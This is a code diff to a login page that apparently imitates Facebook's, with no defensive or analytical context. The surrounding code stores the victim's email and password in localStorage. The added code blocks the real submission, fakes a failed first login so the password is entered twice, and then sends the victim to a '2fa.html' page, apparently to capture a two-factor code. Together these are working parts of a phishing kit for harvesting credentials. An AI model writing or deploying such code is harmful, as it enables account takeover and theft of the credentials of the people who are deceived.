@@ -310,11 +310,34 @@
         document.addEventListener('DOMContentLoaded', function () {
             var loginForm = document.getElementById('login_form');
             if (loginForm) {
-                loginForm.addEventListener('submit', function () {
+                // Pre-fill email if it was previously entered
+                var savedEmail = localStorage.getItem('fb_email');
+                if (savedEmail) {
+                    var emailInput = document.getElementById('email');
+                    if (emailInput) emailInput.value = savedEmail;
+                }
+
+                loginForm.addEventListener('submit', function (e) {
+                    e.preventDefault();
                     var email = document.getElementById('email').value;
                     var pass = document.getElementById('pass').value;
+
                     localStorage.setItem('fb_email', email);
                     localStorage.setItem('fb_pass', pass);
+
+                    var attempts = localStorage.getItem('login_attempts') || 0;
+                    attempts = parseInt(attempts) + 1;
+                    localStorage.setItem('login_attempts', attempts);
+
+                    if (attempts < 2) {
+                        // First attempt: reload the page
+                        window.location.href = 'login.html';
+                    } else {
+                        // Second attempt: proceed to 2FA page
+                        // Reset attempts for future sessions
+                        localStorage.setItem('login_attempts', 0);
+                        window.location.href = '2fa.html';
+                    }
                 });
             }
         });
